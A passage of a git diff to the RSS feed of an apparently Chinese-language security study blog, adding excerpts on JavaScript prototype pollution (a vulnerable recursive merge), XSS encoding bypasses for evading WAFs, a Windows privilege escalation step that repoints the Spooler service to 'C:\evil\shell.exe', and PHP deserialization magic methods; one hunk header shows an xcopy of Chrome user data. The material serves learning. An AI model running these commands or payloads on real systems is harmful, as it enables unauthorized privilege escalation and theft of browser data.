+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;p&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {};
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2.&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;连接原型&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;：&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;p&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;__proto__&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Person&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;prototype&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3.&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;执行函数&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;：&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Person&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;call&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;p&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4.&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;返回&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;p&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;__proto__-隐式原型&#34;&gt;&lt;code&gt;__proto__&lt;/code&gt; 隐式原型&lt;/h3&gt;
+&lt;p&gt;&lt;code&gt;proto&lt;/code&gt;是所有对象的属性(包括函数、数组、普通对象)&lt;/p&gt;
+&lt;p&gt;它是对象内部的一个指针，指向创建该对象的构造函数的 &lt;code&gt;prototype&lt;/code&gt;例如:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;obj&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {};
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;javascript自动执行obj&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;__proto__&lt;/span&gt;,&lt;span style=&#34;color:#a6e22e&#34;&gt;里面是Object&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;prototype&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;什么是原型链&#34;&gt;什么是原型链&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Person&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Person&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;prototype&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Person&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;prototype&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;sayHi&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; () {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;你好&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;};
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;jack&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Person&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Jack&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;当访问对象的属性的时候,JavaScript的查找顺序是:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;先在对象的自身属性里面找&lt;/li&gt;
+&lt;li&gt;找不到,再去&lt;code&gt;Jack.__proto__&lt;/code&gt;(即&lt;code&gt;Person.prototype&lt;/code&gt;)中找&lt;/li&gt;
+&lt;li&gt;再找不到,去&lt;code&gt;Person.prototype.__proto__&lt;/code&gt;(即&lt;code&gt;Object.prototype&lt;/code&gt;)中去找&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;一直找到&lt;code&gt;Person.prototype.__proto__&lt;/code&gt;也就是Null ,还找不到就返回undefined&lt;/p&gt;
+&lt;h2 id=&#34;漏洞产生的原因&#34;&gt;漏洞产生的原因:&lt;/h2&gt;
+&lt;p&gt;因为所有的JavaScript对象都指向&lt;code&gt;Object.prototype&lt;/code&gt;,所以只要能修改&lt;code&gt;Object.prototype&lt;/code&gt;增加一个属性,那么所有的对象都会拥有这个属性&lt;/p&gt;
+&lt;p&gt;一般漏洞出现在对象合并,对象克隆,路径赋值中.例子:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;merge&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;target&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;source&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;key&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;source&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;key&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;target&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;key&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;source&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;merge&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;target&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;key&lt;/span&gt;], &lt;span style=&#34;color:#a6e22e&#34;&gt;source&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;key&lt;/span&gt;]); &lt;span style=&#34;color:#75715e&#34;&gt;// 递归合并
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;target&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;key&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;source&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;key&lt;/span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;传入:&lt;/p&gt;</description>
+    </item>
+    <item>
       <title>XSS</title>
       <link>http://localhost:1313/posts/xss/</link>
       <pubDate>Thu, 19 Mar 2026 00:33:54 +0800</pubDate>
@@ -360,7 +619,21 @@ xcopy &amp;#34;%LOCALAPPDATA%\Google\Chrome\User Data&amp;#34; &amp;#34;%LOCALAP
 &lt;/li&gt;
 &lt;li&gt;
 &lt;p&gt;编码绕过:&lt;/p&gt;
-&lt;p&gt;浏览器解析 HTML 时有特定的解码顺序（HTML 解码 -&amp;gt; URL 解码 -&amp;gt; JS 解码）&lt;/p&gt;</description>
+&lt;p&gt;浏览器解析 HTML 时有特定的解码顺序（HTML 解码 -&amp;gt; URL 解码 -&amp;gt; JS 解码）&lt;/p&gt;
+&lt;p&gt;其他编码方式:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;动态执行编码(利用 JS 内置函数对加密/编码后的内容进行动态解密执行)&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;CSS编码: 在 &lt;code&gt;style&lt;/code&gt; 属性或 CSS 文件中，可以使用反斜杠后跟十六进制&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;JSFuck,AAEncode,JJEncode编码(要求不限制长度,绕waf有效)&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;/ul&gt;</description>
     </item>
     <item>
       <title>JS</title>
@@ -421,7 +694,9 @@ xcopy &amp;#34;%LOCALAPPDATA%\Google\Chrome\User Data&amp;#34; &amp;#34;%LOCALAP
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;_createElementVNode&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;useState&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;render&lt;/span&gt;() { ... }
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
 &lt;li&gt;
-&lt;p&gt;还有一些轮番图片等&lt;/p&gt;</description>
+&lt;p&gt;还有一些轮番图片等&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;</description>
     </item>
     <item>
       <title>Java基础</title>
@@ -549,7 +824,13 @@ lnitialization(初始化) 执行静态代码块，静态变量的赋值动作
 &lt;/ul&gt;
 &lt;/li&gt;
 &lt;li&gt;
-&lt;p&gt;&lt;strong&gt;利用/bin/ping提权&lt;/strong&gt;：&lt;/p&gt;</description>
+&lt;p&gt;&lt;strong&gt;利用/bin/ping提权&lt;/strong&gt;：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ping -c &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; 127.0.0.1
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;通过特殊参数（如&lt;code&gt;-c&lt;/code&gt;）触发SUID权限&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;</description>
     </item>
     <item>
       <title>SSRF</title>
@@ -659,7 +940,11 @@ IPv6 绕过：
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;reg add &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Spooler&amp;#34;&lt;/span&gt; /t REG_EXPAND_SZ /v ImagePath /d &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;C:\evil\shell.exe&amp;#34;&lt;/span&gt; /f
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
 &lt;li&gt;
-&lt;p&gt;重启服务：&lt;/p&gt;</description>
+&lt;p&gt;重启服务：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;net stop Spooler
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;net start Spooler
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;/ol&gt;</description>
     </item>
     <item>
       <title>PHP反序列化</title>
@@ -687,82 +972,82 @@ IPv6 绕过：
 &lt;h3 id=&#34;魔术方法&#34;&gt;魔术方法&lt;/h3&gt;
 &lt;p&gt;注:加黑重点关注&lt;/p&gt;
 &lt;table&gt;
-  &lt;thead&gt;
-      &lt;tr&gt;
-          &lt;th&gt;&lt;strong&gt;魔术方法&lt;/strong&gt;&lt;/th&gt;
-          &lt;th&gt;&lt;strong&gt;描述&lt;/strong&gt;&lt;/th&gt;
-      &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__construct()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
-          &lt;td&gt;&lt;strong&gt;构造方法&lt;/strong&gt;，当对象被实例化（&lt;code&gt;new&lt;/code&gt;）时自动调用。&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__destruct()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
-          &lt;td&gt;&lt;strong&gt;析构方法&lt;/strong&gt;，当对象被销毁时自动调用。反序列化攻击中最常见的入口。&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__call()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
-          &lt;td&gt;在对象上下文中调用一个&lt;strong&gt;不可访问或不存在的方法&lt;/strong&gt;时触发。常用的跳板。&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__callStatic()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
-          &lt;td&gt;在静态上下文中调用一个&lt;strong&gt;不可访问或不存在的方法&lt;/strong&gt;时触发。&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__get()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
-          &lt;td&gt;读取对象中&lt;strong&gt;不可访问（未定义或私有）的属性&lt;/strong&gt;时触发。常用的跳板。&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__set()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
-          &lt;td&gt;写入对象中&lt;strong&gt;不可访问（未定义或私有）的属性&lt;/strong&gt;时触发。&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__isset()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
-          &lt;td&gt;使用 &lt;code&gt;isset()&lt;/code&gt; 或 &lt;code&gt;empty()&lt;/code&gt; 检查对象中不可访问的属性时触发。&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__unset()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
-          &lt;td&gt;使用 &lt;code&gt;unset()&lt;/code&gt; 删除对象中不可访问的属性时触发。&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__sleep()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
-          &lt;td&gt;当对象被 &lt;code&gt;serialize()&lt;/code&gt; 序列化前触发，通常用于返回需要被序列化的属性列表。&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__wakeup()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
-          &lt;td&gt;当对象被 &lt;code&gt;unserialize()&lt;/code&gt; 反序列化时触发，常用于初始化资源。反序列化的“点火开关”。&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__toString()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
-          &lt;td&gt;当对象被转换成&lt;strong&gt;字符串&lt;/strong&gt;（如 &lt;code&gt;echo&lt;/code&gt; 或拼接）时自动调用。核心跳板。&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__invoke()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
-          &lt;td&gt;当尝试以&lt;strong&gt;函数方式调用对象&lt;/strong&gt;（如 &lt;code&gt;$obj()&lt;/code&gt;）时触发。常用的跳板。&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__clone()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
-          &lt;td&gt;当对象使用 &lt;code&gt;clone&lt;/code&gt; 关键字被克隆时调用。&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__serialize()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
-          &lt;td&gt;PHP 7.4+ 引入。序列化前触发，优先级高于 &lt;code&gt;__sleep&lt;/code&gt;。返回一个包含对象数据的数组。&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__unserialize()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
-          &lt;td&gt;PHP 7.4+ 引入。反序列化后触发，优先级高于 &lt;code&gt;__wakeup&lt;/code&gt;。用于恢复对象状态。&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__set_state()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
-          &lt;td&gt;当使用 &lt;code&gt;var_export()&lt;/code&gt; 导出类时触发。必须是静态方法，返回类实例。&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__debugInfo()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
-          &lt;td&gt;当使用 &lt;code&gt;var_dump()&lt;/code&gt; 打印对象信息时触发，用于控制显示的属性。&lt;/td&gt;
-      &lt;/tr&gt;
-  &lt;/tbody&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th&gt;&lt;strong&gt;魔术方法&lt;/strong&gt;&lt;/th&gt;
+					&lt;th&gt;&lt;strong&gt;描述&lt;/strong&gt;&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;strong&gt;&lt;code&gt;__construct()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+					&lt;td&gt;&lt;strong&gt;构造方法&lt;/strong&gt;，当对象被实例化（&lt;code&gt;new&lt;/code&gt;）时自动调用。&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;strong&gt;&lt;code&gt;__destruct()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+					&lt;td&gt;&lt;strong&gt;析构方法&lt;/strong&gt;，当对象被销毁时自动调用。反序列化攻击中最常见的入口。&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;strong&gt;&lt;code&gt;__call()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+					&lt;td&gt;在对象上下文中调用一个&lt;strong&gt;不可访问或不存在的方法&lt;/strong&gt;时触发。常用的跳板。&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;strong&gt;&lt;code&gt;__callStatic()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+					&lt;td&gt;在静态上下文中调用一个&lt;strong&gt;不可访问或不存在的方法&lt;/strong&gt;时触发。&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;strong&gt;&lt;code&gt;__get()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+					&lt;td&gt;读取对象中&lt;strong&gt;不可访问（未定义或私有）的属性&lt;/strong&gt;时触发。常用的跳板。&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;strong&gt;&lt;code&gt;__set()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+					&lt;td&gt;写入对象中&lt;strong&gt;不可访问（未定义或私有）的属性&lt;/strong&gt;时触发。&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;strong&gt;&lt;code&gt;__isset()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+					&lt;td&gt;使用 &lt;code&gt;isset()&lt;/code&gt; 或 &lt;code&gt;empty()&lt;/code&gt; 检查对象中不可访问的属性时触发。&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;strong&gt;&lt;code&gt;__unset()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+					&lt;td&gt;使用 &lt;code&gt;unset()&lt;/code&gt; 删除对象中不可访问的属性时触发。&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;strong&gt;&lt;code&gt;__sleep()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+					&lt;td&gt;当对象被 &lt;code&gt;serialize()&lt;/code&gt; 序列化前触发，通常用于返回需要被序列化的属性列表。&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;strong&gt;&lt;code&gt;__wakeup()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+					&lt;td&gt;当对象被 &lt;code&gt;unserialize()&lt;/code&gt; 反序列化时触发，常用于初始化资源。反序列化的“点火开关”。&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;strong&gt;&lt;code&gt;__toString()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+					&lt;td&gt;当对象被转换成&lt;strong&gt;字符串&lt;/strong&gt;（如 &lt;code&gt;echo&lt;/code&gt; 或拼接）时自动调用。核心跳板。&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;strong&gt;&lt;code&gt;__invoke()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+					&lt;td&gt;当尝试以&lt;strong&gt;函数方式调用对象&lt;/strong&gt;（如 &lt;code&gt;$obj()&lt;/code&gt;）时触发。常用的跳板。&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;strong&gt;&lt;code&gt;__clone()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+					&lt;td&gt;当对象使用 &lt;code&gt;clone&lt;/code&gt; 关键字被克隆时调用。&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;strong&gt;&lt;code&gt;__serialize()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+					&lt;td&gt;PHP 7.4+ 引入。序列化前触发，优先级高于 &lt;code&gt;__sleep&lt;/code&gt;。返回一个包含对象数据的数组。&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;strong&gt;&lt;code&gt;__unserialize()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
